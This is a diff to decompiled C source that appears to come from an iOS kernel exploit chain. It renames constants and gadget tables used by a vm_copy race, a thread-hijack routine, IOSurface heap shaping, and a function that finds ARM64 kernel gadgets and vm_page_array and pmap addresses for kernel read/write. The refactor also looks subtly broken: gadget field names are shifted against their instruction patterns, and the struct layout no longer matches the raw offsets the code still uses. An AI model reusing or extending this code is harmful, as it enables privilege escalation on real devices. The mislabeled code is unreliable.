@@ -1724,6 +1724,40 @@ ssize_t __cdecl write(int __fd, const void *__buf, size_t __nbyte);
 //-------------------------------------------------------------------------
 // Data declarations
 
+struct physmap_gadget_table
+{
+  uint32_t exceptionReturnWords[11];
+  uint64_t ldrX0Ret;
+  uint64_t movX15BrX17;
+  uint64_t movX15BrX21;
+  uint64_t mrsSpselRet;
+  uint64_t strPacibspX1Ret;
+  uint64_t pacizaStrX2Ret;
+  uint64_t movX0Ret;
+  uint64_t movX0X19Ret;
+  uint64_t adrDataRef;
+  uint64_t strDwordPtrRet;
+  uint64_t interruptDisableRet;
+  uint64_t jumpTarget;
+  uint64_t vmPageArray;
+  uint64_t pmapTteTable;
+  uint64_t vmFirstPhysPaddr;
+};
+
+static const integer_t kVmcopyRaceLowPriorityPolicy[4] = { 0x20A51, 0x2710, 0x2711, 1 };
+static const integer_t kVmcopyRaceHighPriorityPolicy[4] = { 0x3E8, 0xF4240, 0xF4241, 1 };
+static const uint64_t kVmcopyFakePageMarkers[2] = { 0x43434343, 0x44444444 };
+
+static const integer_t kThreadHijackReadyPolicy[4] = { 0x960, 0x960, 0x961, 1 };
+static const integer_t kThreadHijackMainPolicy[4] = { 0x2710, 0xF4240, 0xF4241, 1 };
+static const uint64_t kIokitAllocPageAndCount[2] = { 0x4000, 4 };
+
+#define SET_IOSURFACE_ALLOC_PAGE_AND_COUNT(dst) \
+  do { \
+    ((uint64_t *)&(dst))[0] = kIokitAllocPageAndCount[0]; \
+    ((uint64_t *)&(dst))[1] = kIokitAllocPageAndCount[1]; \
+  } while (0)
+
 int def_3E8F0 = -17958193; // weak
 int dword_4 = 16777228; // weak
 int dword_8 = -2147483646; // weak
@@ -1788,9 +1822,6 @@ __int128 xmmword_42D90 = IDA_INT128_C(0x0000000800000000ULL, 0x0000000000000010U
 __int128 xmmword_42DA0 = IDA_INT128_C(0x00007FF000000000ULL, 0x0000000200000680ULL); // weak
 _UNKNOWN unk_42DC8; // weak
 __int128 xmmword_42EC0 = IDA_INT128_C(0x0000000100000001ULL, 0x0000000000000000ULL); // weak
-__int128 xmmword_42F00 = IDA_INT128_C(0x0000000100002711ULL, 0x0000271000020A51ULL); // weak
-__int128 xmmword_42F10 = IDA_INT128_C(0x00000001000F4241ULL, 0x000F4240000003E8ULL); // weak
-__int128 xmmword_42F20 = IDA_INT128_C(0x0000000044444444ULL, 0x0000000043434343ULL); // weak
 __int128 xmmword_42F30 = IDA_INT128_C(0x00000000D280000FULL, 0x00000000D280000FULL); // weak
 __int128 xmmword_42F44 = IDA_INT128_C(0x00000000FFFFFC1FULL, 0x00000000FFFFFFFFULL); // weak
 __int128 xmmword_42F58 = IDA_INT128_C(0x9AC130619AC13041ULL, 0x9262F8429AC03021ULL); // weak
@@ -1836,18 +1867,6 @@ __int128 xmmword_431D0 = IDA_INT128_C(0x0000000000300000ULL, 0x00000000000003C4U
 __int128 xmmword_431E0 = IDA_INT128_C(0x0000000000300000ULL, 0x00000000000003C5ULL); // weak
 __int128 xmmword_431F0 = IDA_INT128_C(0x0000000000000000ULL, 0xFFFFFFFF80000000ULL); // weak
 __int128 xmmword_43200 = IDA_INT128_C(0x0000001000000000ULL, 0x4000000100000001ULL); // weak
-__int128 xmmword_43270 = IDA_INT128_C(0xFFFC00383A870028ULL, 0x2E4A0020BAA20010ULL); // weak
-__int128 xmmword_43280 = IDA_INT128_C(0x7F14042032E50058ULL, 0xBE60005056350048ULL); // weak
-__int128 xmmword_43290 = IDA_INT128_C(0x14000000D280000FULL, 0x14000000D280060FULL); // weak
-__int128 xmmword_432A0 = IDA_INT128_C(0xFC000000FFE0001FULL, 0xFC000000FFFFFFFFULL); // weak
-__int128 xmmword_432B0 = IDA_INT128_C(0x14000000D280000FULL, 0x14000000D28006AFULL); // weak
-__int128 xmmword_432C0 = IDA_INT128_C(0xD5033FDFD5087800ULL, 0xD50343DFD53B4222ULL); // weak
-__int128 xmmword_432D0 = IDA_INT128_C(0x0000000000000001ULL, 0xDEADDAB700010004ULL); // weak
-__int128 xmmword_432E0 = IDA_INT128_C(0x0000000000000004ULL, 0x0000000000004000ULL); // weak
-__int128 xmmword_432F0 = IDA_INT128_C(0x0000000100000961ULL, 0x0000096000000960ULL); // weak
-__int128 xmmword_43300 = IDA_INT128_C(0x00000001000F4241ULL, 0x000F424000002710ULL); // weak
-__int128 xmmword_43350 = IDA_INT128_C(0x8B284528F9400000ULL, 0x90000000D34EFD08ULL); // weak
-__int128 xmmword_43364 = IDA_INT128_C(0xFFFFFFFFFFC00000ULL, 0x9F000000FFFFFFFFULL); // weak
 uint64_t qword_43378[3] = { 1073741824LL, 805306368LL, 536870912LL }; // weak
 unsigned int dword_43390[3] = { 2u, 2u, 0u }; // weak
 unsigned int dword_4339C[] = { 0, 1, 2, 3, 4, 5, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
@@ -10812,7 +10831,10 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
     pthread_create(&v149, 0, (void *(__cdecl *)(void *))call_vtable_ptr_slot2, &raceThreadBlock);
     semaphore_wait(semaphore);
     v28 = pthread_mach_thread_np(v149);
-    *(__int128 *)policy_info = xmmword_42F00;
+    policy_info[0] = kVmcopyRaceLowPriorityPolicy[0];
+    policy_info[1] = kVmcopyRaceLowPriorityPolicy[1];
+    policy_info[2] = kVmcopyRaceLowPriorityPolicy[2];
+    policy_info[3] = kVmcopyRaceLowPriorityPolicy[3];
     thread_policy_set(v28, 2u, policy_info, 4u);
     v29 = get_task_kobject_addr_from_field32(*(uint64_t *)(someStruct + 8), v28);
     if ( !v107 )
@@ -10838,7 +10860,10 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
     v35 = (__int64 *)(v98 + (v23 & 0x3FFF) + v97);
     v36 = v27 + v105;
     flush_cpu_cache(*(uint64_t *)(someStruct + 8), v29 + v107 + 4, 1);
-    *(__int128 *)policy_info = xmmword_42F10;
+    policy_info[0] = kVmcopyRaceHighPriorityPolicy[0];
+    policy_info[1] = kVmcopyRaceHighPriorityPolicy[1];
+    policy_info[2] = kVmcopyRaceHighPriorityPolicy[2];
+    policy_info[3] = kVmcopyRaceHighPriorityPolicy[3];
     v37 = mach_thread_self();
     thread_policy_set(v37, 2u, policy_info, 4u);
     v38 = *(uint64_t *)(someStruct + 8);
@@ -11128,7 +11153,7 @@ LABEL_68:
     *(uint64_t *)(v89 + 264) = 1094795585;
     *(uint32_t *)(v89 + 272) = 0;
     *(uint64_t *)(v89 + 248) = 1111638594;
-    *(__int128 *)(v89 + 136) = xmmword_42F20;
+    memcpy((void *)(v89 + 136), kVmcopyFakePageMarkers, sizeof(kVmcopyFakePageMarkers));
     setup_kernel_exploit_msg(someStruct, *(uint64_t *)(someStruct + 360), 1094795585, 0, 1111638594, 1128481603, 1145324612);
     memset(pageInfoPayload, 0, sizeof(pageInfoPayload));
     query_phys_page_info(someStruct, qword_48040, (__int64)pageInfoPayload);
@@ -11147,9 +11172,6 @@ LABEL_68:
   while ( v54 == 87 );
   return 0;
 }
-// 42F00: using guessed type __int128 xmmword_42F00;
-// 42F10: using guessed type __int128 xmmword_42F10;
-// 42F20: using guessed type __int128 xmmword_42F20;
 // 48008: using guessed type __int64 qword_48008;
 // 48010: using guessed type __int64 qword_48010;
 // 48030: using guessed type __int64 qword_48030;
@@ -17307,62 +17329,54 @@ __int64 __fastcall krw_ctx_setup_physmap(__int64 a1, uint64_t **a2, __int64 a3)
   unsigned __int64 v28; // x0
   unsigned int v29; // w21
   unsigned int v30; // w8
-  __int128 v31; // [xsp+10h] [xbp-90h] BYREF
-  int v32; // [xsp+20h] [xbp-80h]
-  __int128 v33; // [xsp+30h] [xbp-70h] BYREF
-  int v34; // [xsp+40h] [xbp-60h]
+  struct physmap_gadget_table *gadgets = (struct physmap_gadget_table *)a1;
+  static const uint32_t exceptionReturnWords[11] = {
+    0xBAA20010, 0x2E4A0020, 0x3A870028, 0xFFFC0038,
+    0x56350048, 0xBE600050, 0x32E50058, 0x7F140420,
+    0xEA140568, 0xEA2305C0, 0x2BCB05C8
+  };
+  static const uint32_t exact2Mask[2] = { 0xFFFFFFFF, 0xFFFFFFFF };
+  static const uint32_t exact3Mask[3] = { 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF };
+  static const uint32_t exact4Mask[4] = { 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF };
+  static const uint32_t ldrX0RetWords[2] = { 0xF9402400, 0xD65F03C0 };
+  static const uint32_t movX15BrX17Words[4] = { 0xD280060F, 0x14000000, 0xD280000F, 0x14000000 };
+  static const uint32_t movX15BrX21Words[4] = { 0xD28006AF, 0x14000000, 0xD280000F, 0x14000000 };
+  static const uint32_t movX15BranchMasks[4] = { 0xFFFFFFFF, 0xFC000000, 0xFFE0001F, 0xFC000000 };
+  static const uint32_t mrsSpselRetWords[2] = { 0xD508831F, 0xD65F03C0 };
+  static const uint32_t strPacibspLegacyWords[2] = { 0xF9000041, 0xD65F03C0 };
+  static const uint32_t strPacibspModernWords[2] = { 0xF9000022, 0xD65F03C0 };
+  static const uint32_t movX0RetWords[3] = { 0xAA0003E8, 0x52820002, 0x72A003A2 };
+  static const uint32_t movX0X19RetWords[2] = { 0xB2400000, 0x17000000 };
+  static const uint32_t movX0X19RetMasks[2] = { 0xFFFFFFFF, 0xFF000000 };
+  static const uint32_t adrDataRefWords[4] = { 0xD53B4222, 0xD50343DF, 0xD5087800, 0xD5033FDF };
+  static const uint32_t jumpTargetWords[4] = { 0x00010004, 0xDEADDAB7, 0x00000001, 0x00000000 };
+  static const uint32_t vmPageArrayWords[5] = { 0xD34EFD08, 0x90000000, 0xF9400000, 0x8B284528, 0x78E13108 };
+  static const uint32_t vmPageArrayMasks[5] = { 0xFFFFFFFF, 0x9F000000, 0xFFC00000, 0xFFFFFFFF, 0xFFFFFFFF };
 
   v6 = *(uint64_t *)algn_480E0;
   if ( strstr((const char *)qword_480D8, "T8020") )
     return 5;
-  *(__int128 *)a1 = xmmword_43270;
-  *(__int128 *)(a1 + 16) = xmmword_43280;
-  *(uint64_t *)(a1 + 32) = 0xEA2305C0EA140568LL;
-  *(uint32_t *)(a1 + 40) = 734725576;
-  *(uint64_t *)&v33 = 0xD65F03C0F9402400LL;
-  *(uint64_t *)&v31 = -1;
-  *(uint64_t *)(a1 + 48) = kobj_snapshot_lookup_wrapper(a2, (__int64)&v33, (__int64)&v31, 2u);
-  v33 = xmmword_43290;
-  v31 = xmmword_432A0;
-  *(uint64_t *)(a1 + 56) = kobj_snapshot_lookup_wrapper(a2, (__int64)&v33, (__int64)&v31, 4u);
-  v33 = xmmword_432B0;
-  v31 = xmmword_432A0;
-  *(uint64_t *)(a1 + 64) = kobj_snapshot_lookup_wrapper(a2, (__int64)&v33, (__int64)&v31, 4u);
-  *(uint64_t *)&v33 = 0xD65F03C0D508831FLL;
-  *(uint64_t *)&v31 = -1;
-  *(uint64_t *)(a1 + 72) = kobj_snapshot_lookup_wrapper(a2, (__int64)&v33, (__int64)&v31, 2u);
+  memcpy(gadgets->exceptionReturnWords, exceptionReturnWords, sizeof(gadgets->exceptionReturnWords));
+  gadgets->ldrX0Ret = LOOKUP_KOBJ_PATTERN(a2, ldrX0RetWords, exact2Mask, 2);
+  gadgets->movX15BrX17 = LOOKUP_KOBJ_PATTERN(a2, movX15BrX17Words, movX15BranchMasks, 4);
+  gadgets->movX15BrX21 = LOOKUP_KOBJ_PATTERN(a2, movX15BrX21Words, movX15BranchMasks, 4);
+  gadgets->mrsSpselRet = LOOKUP_KOBJ_PATTERN(a2, mrsSpselRetWords, exact2Mask, 2);
   if ( v6 < 0x918C5A83400LL )
   {
     v9 = -1459420545;
-    *(uint64_t *)&v33 = 0xD65F03C0F9000041LL;
-    *(uint64_t *)&v31 = -1;
-    v8 = kobj_snapshot_lookup_wrapper(a2, (__int64)&v33, (__int64)&v31, 2u);
+    v8 = LOOKUP_KOBJ_PATTERN(a2, strPacibspLegacyWords, exact2Mask, 2);
   }
   else
   {
-    *(uint64_t *)&v33 = 0xD65F03C0F9000022LL;
-    *(uint64_t *)&v31 = -1;
-    v8 = kobj_snapshot_lookup_wrapper(a2, (__int64)&v33, (__int64)&v31, 2u);
+    v8 = LOOKUP_KOBJ_PATTERN(a2, strPacibspModernWords, exact2Mask, 2);
     v9 = -1459420449;
   }
-  *(uint64_t *)(a1 + 80) = v8;
-  *(uint64_t *)&v33 = 0x52820002AA0003E8LL;
-  DWORD2(v33) = 1923089314;
-  *(uint64_t *)&v31 = -1;
-  DWORD2(v31) = -1;
-  *(uint64_t *)(a1 + 88) = kobj_snapshot_lookup_wrapper(a2, (__int64)&v33, (__int64)&v31, 3u);
-  *(uint64_t *)&v33 = 0x17000000B2400000LL;
-  *(uint64_t *)&v31 = 0xFF000000FFFFFFFFLL;
-  *(uint64_t *)(a1 + 96) = kobj_snapshot_lookup_wrapper(a2, (__int64)&v33, (__int64)&v31, 2u) + 8;
-  v33 = xmmword_432C0;
-  *(uint64_t *)&v31 = -1;
-  *((uint64_t *)&v31 + 1) = -1;
-  *(uint64_t *)(a1 + 104) = kobj_snapshot_lookup_wrapper(a2, (__int64)&v33, (__int64)&v31, 4u);
-  v33 = xmmword_432D0;
-  *(uint64_t *)&v31 = -1;
-  *((uint64_t *)&v31 + 1) = -1;
-  v10 = kobj_snapshot_pattern_search_via_ctx((__int64)a2, (__int64)&v33, (__int64)&v31, 4u);
-  *(uint64_t *)(a1 + 120) = v10 - 8;
+  gadgets->strPacibspX1Ret = v8;
+  gadgets->pacizaStrX2Ret = LOOKUP_KOBJ_PATTERN(a2, movX0RetWords, exact3Mask, 3);
+  gadgets->movX0Ret = LOOKUP_KOBJ_PATTERN(a2, movX0X19RetWords, movX0X19RetMasks, 2) + 8;
+  gadgets->movX0X19Ret = LOOKUP_KOBJ_PATTERN(a2, adrDataRefWords, exact4Mask, 4);
+  v10 = kobj_snapshot_pattern_search_via_ctx((__int64)a2, (__int64)jumpTargetWords, (__int64)exact4Mask, 4u);
+  gadgets->jumpTarget = v10 - 8;
   v11 = KRWCTX_FROM_RAW_FIELD(a3, 32);
   v12 = kread_u64_value(a3, v10 + 16);
   v13 = krw_xpac_vaddr_2(v11, v12);
@@ -17380,13 +17394,13 @@ __int64 __fastcall krw_ctx_setup_physmap(__int64 a1, uint64_t **a2, __int64 a3)
   *(uint64_t *)(a1 + 112) = v13 + (v15 << 38 >> 36) + v14;
 LABEL_14:
   v18 = KRWCTX_FROM_RAW_FIELD(a3, 32);
-  v19 = kread_u64_value(a3, *(uint64_t *)(a1 + 120) + 24LL);
+  v19 = kread_u64_value(a3, gadgets->jumpTarget + 24LL);
   v20 = krw_xpac_vaddr_2(v18, v19);
   v21 = 0;
   while ( 1 )
   {
     v22 = read_u32_from_kobj_snapshot((__int64)a2, *a2, v20 + v21);
-    if ( (v22 & 0xFC000000) == 0x94000000 && v20 + v21 + (v22 << 38 >> 36) == *(uint64_t *)(a1 + 112) )
+    if ( (v22 & 0xFC000000) == 0x94000000 && v20 + v21 + (v22 << 38 >> 36) == gadgets->adrDataRef )
       break;
     v21 += 4;
     if ( (uint32_t)v21 == 768 )
@@ -17415,32 +17429,19 @@ LABEL_20:
     }
   }
   v27 = read_u32_from_kobj_snapshot((__int64)a2, *a2, v26 + 4);
-  *(uint64_t *)(a1 + 128) = ((v26 + 4) & 0xFFFFFFFFFFFFF000LL)
+  gadgets->vmPageArray = ((v26 + 4) & 0xFFFFFFFFFFFFF000LL)
                         + 2LL * (int)(((v27 >> 18) & 0x1800) | (v27 >> 5 << 13))
                         + (((unsigned int)read_u32_from_kobj_snapshot((__int64)a2, *a2, v26 + 8) >> 7) & 0x7FF8);
-  v33 = xmmword_43350;
-  v34 = 2028024072;
-  v31 = xmmword_43364;
-  v32 = -1;
-  v28 = kobj_snapshot_lookup_wrapper(a2, (__int64)&v33, (__int64)&v31, 5u);
-  *(uint64_t *)(a1 + 136) = v28;
+  v28 = LOOKUP_KOBJ_PATTERN(a2, vmPageArrayWords, vmPageArrayMasks, 5);
+  gadgets->pmapTteTable = v28;
   v29 = read_u32_from_kobj_snapshot((__int64)a2, *a2, v28 + 4);
-  v30 = read_u32_from_kobj_snapshot((__int64)a2, *a2, *(uint64_t *)(a1 + 136) + 8LL);
+  v30 = read_u32_from_kobj_snapshot((__int64)a2, *a2, gadgets->pmapTteTable + 8LL);
   result = 0;
-  *(uint64_t *)(a1 + 136) = ((*(uint64_t *)(a1 + 136) + 4LL) & 0xFFFFFFFFFFFFF000LL)
+  gadgets->pmapTteTable = ((gadgets->pmapTteTable + 4LL) & 0xFFFFFFFFFFFFF000LL)
                         + 2LL * (int)(((v29 >> 18) & 0x1800) | (v29 >> 5 << 13))
                         + ((v30 >> 7) & 0x7FF8);
   return result;
 }
-// 43270: using guessed type __int128 xmmword_43270;
-// 43280: using guessed type __int128 xmmword_43280;
-// 43290: using guessed type __int128 xmmword_43290;
-// 432A0: using guessed type __int128 xmmword_432A0;
-// 432B0: using guessed type __int128 xmmword_432B0;
-// 432C0: using guessed type __int128 xmmword_432C0;
-// 432D0: using guessed type __int128 xmmword_432D0;
-// 43350: using guessed type __int128 xmmword_43350;
-// 43364: using guessed type __int128 xmmword_43364;
 // 480D8: using guessed type __int64 qword_480D8;
 // 480E0: using guessed type uint8_t algn_480E0[32];
 
@@ -17548,7 +17549,7 @@ __int64 __fastcall necp_set_opt_string_2(__int64 a1, __int64 a2)
   v7 = kread_u64_value(*(uint64_t *)a1, v6);
   *(uint64_t *)(a2 + 32) = v7;
   v8 = krw_xpac_vaddr_2(KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32), v7);
-  v77 = xmmword_432E0;
+  SET_IOSURFACE_ALLOC_PAGE_AND_COUNT(v77);
   *(uint64_t *)(a2 + 16) = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64, __int128 *))(**(uint64_t **)(a1 + 8) + 8LL))(
                            *(uint64_t *)(a1 + 8),
                            qword_480A0,
@@ -17665,7 +17666,7 @@ __int64 __fastcall necp_set_opt_string_2(__int64 a1, __int64 a2)
           qword_48078 + 4,
           (v69 & 0xFFFFFFFFFFFFLL) | ((unsigned __int64)(unsigned __int16)word_48066 << 48));
   kwrite_u64_to_addr(v70, v69, v71);
-  v77 = xmmword_432E0;
+  SET_IOSURFACE_ALLOC_PAGE_AND_COUNT(v77);
   v72 = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64, __int128 *))(**(uint64_t **)(a1 + 8) + 8LL))(
           *(uint64_t *)(a1 + 8),
           qword_480A0,
@@ -17700,7 +17701,6 @@ __int64 __fastcall necp_set_opt_string_2(__int64 a1, __int64 a2)
 // 18: using guessed type int;
 // 1C: using guessed type int;
 // 20: using guessed type segment_command_64 stru_20;
-// 432E0: using guessed type __int128 xmmword_432E0;
 // 48048: using guessed type __int16 word_48048;
 // 4804A: using guessed type __int16 word_4804A;
 // 4804C: using guessed type __int16 word_4804C;
@@ -17767,7 +17767,7 @@ __int64 __fastcall trigger_iokit_property_exploit(__int64 a1)
 {
   __int128 v3; // [xsp+20h] [xbp-30h] BYREF
 
-  v3 = xmmword_432E0;
+  SET_IOSURFACE_ALLOC_PAGE_AND_COUNT(v3);
   *(uint64_t *)&v3 = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64, __int128 *))(**(uint64_t **)(a1 + 8) + 8LL))(
                      *(uint64_t *)(a1 + 8),
                      qword_480A0,
@@ -17781,7 +17781,6 @@ __int64 __fastcall trigger_iokit_property_exploit(__int64 a1)
   (*(void (__fastcall **)(uint64_t, __int64))(**(uint64_t **)(a1 + 8) + 48LL))(*(uint64_t *)(a1 + 8), 18);
   return (*(__int64 (__fastcall **)(uint64_t, __int64))(**(uint64_t **)(a1 + 8) + 48LL))(*(uint64_t *)(a1 + 8), 16);
 }
-// 432E0: using guessed type __int128 xmmword_432E0;
 // 480A0: using guessed type __int64 qword_480A0;
 // 480B0: using guessed type __int64 qword_480B0;
 
@@ -17802,14 +17801,16 @@ __int64 __fastcall wait_thread_ready(__int64 a1, uint64_t **a2)
     v6 = mach_thread_self();
     thread_switch(v6, 0, 0);
   }
-  *(__int128 *)policy_info = xmmword_432F0;
+  policy_info[0] = kThreadHijackReadyPolicy[0];
+  policy_info[1] = kThreadHijackReadyPolicy[1];
+  policy_info[2] = kThreadHijackReadyPolicy[2];
+  policy_info[3] = kThreadHijackReadyPolicy[3];
   v7 = mach_thread_self();
   thread_policy_set(v7, 2u, policy_info, 4u);
   result = (*(__int64 (__fastcall **)(uint64_t, __int64))(**(uint64_t **)(a1 + 8) + 48LL))(*(uint64_t *)(a1 + 8), 53);
   **a2 = 2;
   return result;
 }
-// 432F0: using guessed type __int128 xmmword_432F0;
 
 //----- (000000000001B42C) ----------------------------------------------------
 __int64 __fastcall thread_hijack_exploit(__int64 a1)
@@ -17880,10 +17881,13 @@ __int64 __fastcall thread_hijack_exploit(__int64 a1)
   v54 = 0u;
   memset(connect, 0, sizeof(connect));
   necp_set_opt_string_2(a1, (__int64)connect);
-  policy_info = xmmword_43300;
+  ((integer_t *)&policy_info)[0] = kThreadHijackMainPolicy[0];
+  ((integer_t *)&policy_info)[1] = kThreadHijackMainPolicy[1];
+  ((integer_t *)&policy_info)[2] = kThreadHijackMainPolicy[2];
+  ((integer_t *)&policy_info)[3] = kThreadHijackMainPolicy[3];
   v3 = mach_thread_self();
   thread_policy_set(v3, 2u, (thread_policy_t)&policy_info, 4u);
-  v57 = xmmword_432E0;
+  SET_IOSURFACE_ALLOC_PAGE_AND_COUNT(v57);
   v4 = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64, __int128 *))(**(uint64_t **)(a1 + 8) + 8LL))(
          *(uint64_t *)(a1 + 8),
          qword_480A0,
@@ -17893,7 +17897,7 @@ __int64 __fastcall thread_hijack_exploit(__int64 a1)
   kwrite_u64_to_addr(*(uint64_t *)a1, v4 + 8, v4 + 256);
   kwrite_u64_to_addr(*(uint64_t *)a1, v4 + 16, v4 + 512);
   kwrite_u64_to_addr(*(uint64_t *)a1, v4 + 24, v4 + 768);
-  v57 = xmmword_432E0;
+  SET_IOSURFACE_ALLOC_PAGE_AND_COUNT(v57);
   v5 = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64, __int128 *))(**(uint64_t **)(a1 + 8) + 8LL))(
          *(uint64_t *)(a1 + 8),
          qword_480A0,
@@ -17915,7 +17919,7 @@ __int64 __fastcall thread_hijack_exploit(__int64 a1)
   v10 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32);
   v11 = kread_u64_value(*(uint64_t *)a1, v9 + 64);
   v12 = krw_xpac_vaddr_2(v10, v11);
-  v57 = xmmword_432E0;
+  SET_IOSURFACE_ALLOC_PAGE_AND_COUNT(v57);
   v13 = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64, __int128 *))(**(uint64_t **)(a1 + 8) + 8LL))(
           *(uint64_t *)(a1 + 8),
           qword_480A0,
@@ -17953,7 +17957,7 @@ __int64 __fastcall thread_hijack_exploit(__int64 a1)
           1,
           v58);
   v44 = (kread_u64_value(*(uint64_t *)a1, v42 + 8) & 0xFFFF000000003FFFLL) | v18;
-  v57 = xmmword_432E0;
+  SET_IOSURFACE_ALLOC_PAGE_AND_COUNT(v57);
   v43 = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64, __int128 *))(**(uint64_t **)(a1 + 8) + 8LL))(
           *(uint64_t *)(a1 + 8),
           qword_480A0,
@@ -17965,7 +17969,7 @@ __int64 __fastcall thread_hijack_exploit(__int64 a1)
           qword_48098,
           20592);
   kwrite_u64_to_addr(v19, v43 + 64, v20);
-  v57 = xmmword_432E0;
+  SET_IOSURFACE_ALLOC_PAGE_AND_COUNT(v57);
   v46 = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64, __int128 *))(**(uint64_t **)(a1 + 8) + 8LL))(
           *(uint64_t *)(a1 + 8),
           qword_480A0,
@@ -18088,8 +18092,6 @@ __int64 __fastcall thread_hijack_exploit(__int64 a1)
   return 0;
 }
 // 20: using guessed type segment_command_64 stru_20;
-// 432E0: using guessed type __int128 xmmword_432E0;
-// 43300: using guessed type __int128 xmmword_43300;
 // 43378: using guessed type uint64_t qword_43378[3];
 // 43390: using guessed type unsigned int dword_43390[3];
 // 48080: using guessed type __int64 qword_48080;
